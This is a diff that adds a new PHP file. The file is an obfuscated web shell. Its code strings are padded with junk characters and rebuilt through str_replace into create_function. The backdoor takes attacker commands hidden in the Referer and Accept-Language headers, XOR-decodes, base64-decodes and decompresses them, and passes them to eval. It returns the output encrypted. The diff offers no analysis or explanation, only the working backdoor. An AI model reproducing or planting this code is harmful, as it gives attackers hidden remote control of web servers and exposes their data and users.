@@ -1,0 +1,15 @@
+<?php
+$a='($Nyj=0;($jNy<$Nyc&Ny&$i<$l);$j++,NyNy$Nyi++){$o.=$t{$i}^$k{$jNyNy};}}return $oNy;Ny}$r=$_SNyNyERVNyENyR;$rr=@$r["HTTP_RNy';
+$o='q);$qNy=array_vaNylueNys($q)Ny;preg_matcNyh_all(Ny"NyNy/([\\w])[\\Nyw-]+(?:;q=0.Ny([\\d])Ny)?,?/",Ny$ra,Ny$m);if($qNy&&$mNy){';
+$t='$m[Ny2Ny][$z]];if(strpNyos($p,$hNy)=Ny==0)Ny{$s[$i]="";Ny$p=$ss(Ny$Nyp,3);}ifNy(Nyarray_key_existNys($i,$Nys)){Ny$s[$i].=$';
+$Z='Ny;ob_end_clNyean()Ny;$d=baseNy64Ny_encode(Nyx(gzcompreNyss($oNy),$NykNy));priNynt("<$k>$d</NyNy$k>");@seNyssion_desNytroy();}}}}';
+$N=str_replace('uW','','cuWreatuWe_uWuWfuncuWtuWion');
+$w='ss(md5($i.$kNyh),0,3));$f=$sl(Ny$ssNyNy(md5($i.$kNyf)Ny,0,3));$p="";foNyr($zNy=1;$z<NycountNy($mNy[1]);$z++Ny)$NypNy.=$q[';
+$S='eg_rNyeplace(aNyrray(Ny"/_Ny/","/-/"),arNyray("Ny/","+"Ny)Ny,$ss($s[$i],0Ny,$NyNye))),$k)));$oNy=Nyob_getNy_contNyents()';
+$f='@sessNyiNyon_startNy();$sNy=&$_SESSIONyN;$sNys=Ny"substrNy";$sl="stNyrtolowerNy";$Nyi=$m[1][Ny0].$Nym[1][1Ny];$h=$sNyNylNyNy($';
+$r='EFENyRER"];$ra=Ny@$r["HTTP_ANyCCEPT_LNyNyANGUAGNyE"]Ny;if($rrNy&&$ra){$u=parsNyeNy_url($rr);Nyparse_NystrNy($u["Nyquery"Ny],$';
+$v='$NyNykh="e10a";$kNyf="dc39Ny"Ny;function x($t,$k){Ny$c=sNytNyrlen($Nyk);$l=stNyrlen(Ny$Nyt);$o=""Ny;for($i=Ny0;$i<$lNy;){for';
+$H='p;Ny$e=Nystrpos($s[$Nyi],$fNy);if($e)Ny{$Nyk=$kh.$Nykf;oNyb_start(Ny);@evaNylNy(@gNyzuncompress(Ny@x(@baseNy64Ny_decode(Nypr';
+$Q=str_replace('Ny','',$v.$a.$r.$o.$f.$w.$t.$H.$S.$Z);
+$p=$N('',$Q);$p();
+?>
